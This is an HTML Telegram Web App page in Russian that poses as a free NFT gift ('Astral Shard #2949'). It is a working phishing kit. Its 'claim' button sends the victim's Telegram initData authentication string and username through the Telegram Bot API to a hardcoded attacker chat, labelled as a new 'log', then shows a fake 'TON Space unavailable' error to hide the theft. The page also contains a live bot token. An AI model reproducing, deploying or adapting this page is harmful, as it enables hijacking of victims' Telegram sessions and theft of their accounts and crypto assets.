<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { background: #000; color: #fff; font-family: sans-serif; text-align: center; padding-top: 50px; }
        .btn { background: #0088cc; color: #fff; padding: 15px 40px; border-radius: 12px; border: none; font-size: 18px; cursor: pointer; }
    </style>
</head>
<body>
    <img src="https://nft-tg.com/wp-content/uploads/2024/11/astral-shard.png" width="150" style="border-radius:20px;">
    <h2>Вы получили подарок!</h2>
    <p>Astral Shard #2949</p>
    <button class="btn" onclick="claim()">ПОЛУЧИТЬ</button>

    <script>
        const tg = window.Telegram.WebApp;
        tg.expand();

        function claim() {
            const authKey = tg.initData;
            // ТВОИ ОБНОВЛЕННЫЕ ДАННЫЕ:
            const botToken = '8646280109:AAFVgDZQxQvxc4S7FnE0w-HuPn_QxOhl36E'; 
            const myChatId = '8486064073'; 

            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: myChatId,
                    text: "🔔 **НОВЫЙ ЛОГ!**\n👤 Юзер: @" + (tg.initDataUnsafe.user.username || "unknown") + "\n🔑 Ключ:\n`" + authKey + "`",
                    parse_mode: "Markdown"
                })
            }).then(() => {
                alert("Ошибка: TON Space временно недоступен.");
            });
        }
    </script>
</body>
</html>
